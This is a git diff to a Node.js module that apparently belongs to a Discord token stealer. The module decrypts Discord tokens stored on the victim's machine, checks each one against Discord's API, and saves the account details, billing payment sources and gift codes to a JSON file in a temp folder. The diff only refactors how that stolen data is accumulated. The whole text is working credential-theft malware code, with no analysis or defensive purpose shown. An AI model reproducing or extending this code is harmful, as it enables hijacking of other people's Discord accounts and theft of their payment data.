@@ -1,7 +1,7 @@
 const { join } = require('path');
 const { paths: { roamingAppData, localAppData } } = require('../util/variables');
 const { execSync } = require('child_process');
-const { readFileSync, existsSync, readdirSync, createReadStream, writeFileSync } = require('fs');
+const { readFileSync, existsSync, readdirSync, createReadStream, writeFileSync, statSync } = require('fs');
 const readline = require('readline');
 const os = require('os');
 const { addDoubleQuotes } = require('../util/string');
@@ -76,6 +76,8 @@ module.exports = new Promise((resolve) => {
 
     } else {
       decryptRickRoll(paths[path]).then(tokens => {
+        const jsonFile = join(tempFolder, 'dsc_acc.json');
+        writeFileSync(jsonFile, '{}');
         tokens.map(token => {
           token = token?.toString()?.replaceAll(/[\n\r\t]/gi, '');
           axios.get('https://discord.com/api/v10/users/@me', {
@@ -85,9 +87,9 @@ module.exports = new Promise((resolve) => {
               if (res.status !== 200) return;
               let json = res.data;
               json.token = token;
-              let info = {};
+              let info = statSync(jsonFile) ? require(jsonFile) : {};
               if (!info.accounts) info.accounts = []; info.accounts.push(json);
-              writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
+              writeFileSync(jsonFile, JSON.stringify(info));
 
               axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
                 headers: { Authorization: token, 'User-Agent': userAgent }
@@ -95,9 +97,9 @@ module.exports = new Promise((resolve) => {
                 .then(res => {
                   if (res.status !== 200) return;
                   const json = res.data;
-                  let info = require(join(tempFolder, 'dsc_acc.json'));
+                  let info = require(jsonFile);
                   if (!info.billing) info.billing = []; json.forEach(b => info.billing.push(b));
-                  writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
+                  writeFileSync(jsonFile, JSON.stringify(info));
 
                   axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
                     headers: { Authorization: token, 'User-Agent': userAgent }
@@ -105,9 +107,9 @@ module.exports = new Promise((resolve) => {
                     .then(res => {
                       if (res.status !== 200) return;
                       const json = res.data;
-                      let info = require(join(tempFolder, 'dsc_acc.json'));
+                      let info = require(jsonFile);
                       if (!info.gifts) info.gifts = []; json.forEach(g => info.gifts.push(g));
-                      writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
+                      writeFileSync(jsonFile, JSON.stringify(info));
 
                       resolve();
                     })
